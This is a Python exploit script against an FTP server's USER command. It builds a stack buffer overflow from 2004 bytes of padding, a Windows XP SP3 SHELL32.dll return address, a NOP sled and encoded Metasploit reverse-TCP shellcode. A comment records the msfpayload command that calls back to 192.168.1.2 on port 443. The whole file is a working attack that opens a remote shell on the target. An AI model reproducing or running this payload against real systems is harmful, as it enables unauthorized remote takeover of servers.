import sys, socket, time
 
# Use in the form "python fuzzer.py  "
 
host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user
 
#badchar '0x00, 0x0A, 0x0D'
#msfpayload windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -t python
#[*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)
 
buf =  ""
buf += "\xdb\xdf\xb8\xec\xcb\xb8\x3e\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x4f\x83\xea\xfc\x31\x42\x15\x03\x42\x15\x0e"
buf += "\x3e\x44\xd6\x47\xc1\xb5\x27\x37\x4b\x50\x16\x65\x2f"
buf += "\x10\x0b\xb9\x3b\x74\xa0\x32\x69\x6d\x33\x36\xa6\x82"
buf += "\xf4\xfc\x90\xad\x05\x31\x1d\x61\xc5\x50\xe1\x78\x1a"
buf += "\xb2\xd8\xb2\x6f\xb3\x1d\xae\x80\xe1\xf6\xa4\x33\x15"
buf += "\x72\xf8\x8f\x14\x54\x76\xaf\x6e\xd1\x49\x44\xc4\xd8"
buf += "\x99\xf5\x53\x92\x01\x7d\x3b\x03\x33\x52\x58\x7f\x7a"
buf += "\xdf\xaa\x0b\x7d\x09\xe3\xf4\x4f\x75\xaf\xca\x7f\x78"
buf += "\xae\x0b\x47\x63\xc5\x67\xbb\x1e\xdd\xb3\xc1\xc4\x68"
buf += "\x26\x61\x8e\xca\x82\x93\x43\x8c\x41\x9f\x28\xdb\x0e"
buf += "\xbc\xaf\x08\x25\xb8\x24\xaf\xea\x48\x7e\x8b\x2e\x10"
buf += "\x24\xb2\x77\xfc\x8b\xcb\x68\x58\x73\x69\xe2\x4b\x60"
buf += "\x0b\xa9\x03\x45\x21\x52\xd4\xc1\x32\x21\xe6\x4e\xe8"
buf += "\xad\x4a\x06\x36\x29\xac\x3d\x8e\xa5\x53\xbe\xee\xec"
buf += "\x97\xea\xbe\x86\x3e\x93\x55\x57\xbe\x46\xf9\x07\x10"
buf += "\x39\xb9\xf7\xd0\xe9\x51\x12\xdf\xd6\x41\x1d\x35\x61"
buf += "\x46\x8a\x76\xda\x49\x49\x1f\x19\x49\x4c\x64\x94\xaf"
buf += "\x24\x8a\xf1\x78\xd1\x33\x58\xf2\x40\xbb\x76\x92\xe1"
buf += "\x2e\x1d\x62\x6f\x53\x8a\x35\x38\xa5\xc3\xd3\xd4\x9c"
buf += "\x7d\xc1\x24\x78\x45\x41\xf3\xb9\x48\x48\x76\x85\x6e"
buf += "\x5a\x4e\x06\x2b\x0e\x1e\x51\xe5\xf8\xd8\x0b\x47\x52"
buf += "\xb3\xe0\x01\x32\x42\xcb\x91\x44\x4b\x06\x64\xa8\xfa"
buf += "\xff\x31\xd7\x33\x68\xb6\xa0\x29\x08\x39\x7b\xea\x38"
buf += "\x70\x21\x5b\xd1\xdd\xb0\xd9\xbc\xdd\x6f\x1d\xb9\x5d"
buf += "\x85\xde\x3e\x7d\xec\xdb\x7b\x39\x1d\x96\x14\xac\x21"
buf += "\x05\x14\xe5"
 
# Return Address 0x7C9D30D7 in SHELL32.dll (Win XP SP3)
ret = '\xD7\x30\x9D\x7C' # Packed in little endian
 
# NOP Padding
nop = '\x90'*20
 
# EIP Writing Pattern
pattern = "A"*2004 + ret + nop + buf # Our exploit together. Junk -&gt; Return Address -&gt; NOPS -&gt; Shellcode
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address
client.recv(1024) # Recieve FTP Banner
client.send("USER " + pattern) # Send the user command with a variable length name
client.close()
